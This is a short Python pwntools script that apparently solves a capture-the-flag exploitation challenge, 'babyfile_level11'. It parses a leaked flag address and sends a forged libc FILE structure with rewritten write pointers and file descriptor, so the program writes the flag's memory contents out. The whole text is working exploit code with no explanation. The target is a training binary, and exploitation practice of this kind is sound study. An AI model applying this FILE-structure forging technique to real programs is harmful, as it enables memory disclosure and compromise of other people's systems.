# new_note -> open_file -> write_fp -> write_file

from pwn import *

context.arch = 'amd64'

p = process("/challenge/babyfile_level11")
binary = ELF("/challenge/babyfile_level11")

# flag loc leak
p.recvuntil(b"located at ")
flag_loc_leak = int(p.recvuntil(b'\n')[:-1], 16)

# new_note
p.sendline(b"new_note")
p.sendline(b"100")

# open_file
p.sendline(b"open_file")

# write_fp
fs = FileStructure()
fs.flags = 0x800
fs.fileno = 4
fs._IO_write_base = flag_loc_leak
fs._IO_read_end = flag_loc_leak
fs._IO_write_ptr = flag_loc_leak + 100
payload = bytes(fs)[:0x74]
#payload = fs.write(flag_loc_leak, 50)
p.sendline(b"write_fp")
p.send(payload)

# write_file
print(p.recv())
p.sendline(b"write_file")
p.sendline(b"quit")

p.interactive()
